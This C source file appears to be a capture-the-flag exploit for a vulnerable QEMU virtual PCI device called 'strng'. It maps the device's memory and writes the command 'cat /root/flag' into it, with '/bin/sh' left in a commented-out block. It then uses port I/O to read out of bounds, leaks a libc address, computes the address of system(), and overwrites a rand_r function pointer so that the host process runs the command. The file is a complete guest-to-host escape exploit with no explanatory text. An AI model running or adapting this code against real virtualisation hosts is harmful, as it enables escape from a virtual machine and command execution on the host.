#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>
#include <stdint.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc050;


void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}


uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

uint32_t pmio_arbread(uint32_t offset)
{
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint32_t offset, uint32_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main(int argc, char *argv[])
{
    
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
 

    mmio_write(8,0x20746163);
    mmio_write(12,0x6f6f722f);
    mmio_write(16,0x6c662f74);
    mmio_write(20,0x006761);
    
    /*
    //2f62696e2f7368
    mmio_write(8,0x6e69622f);
    mmio_write(12,0x0068732f);
    */
    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");


    // leaking libc address 
    uint64_t srandom_addr=pmio_arbread(0x108);
    srandom_addr=srandom_addr<<32;
    srandom_addr+=pmio_arbread(0x104);
    printf("leaking srandom addr: 0x%llx\n",srandom_addr);
    uint64_t libc_base= srandom_addr-0x3a8e0;
    uint64_t system_addr= libc_base+0x453a0;
    printf("libc base: 0x%llx\n",libc_base);
    printf("system addr: 0x%llx\n",system_addr);
    
    // overwrite rand_r pointer to system
    pmio_abwrite(0x114,system_addr&0xffffffff);

    mmio_write(0xc,0);

     
}
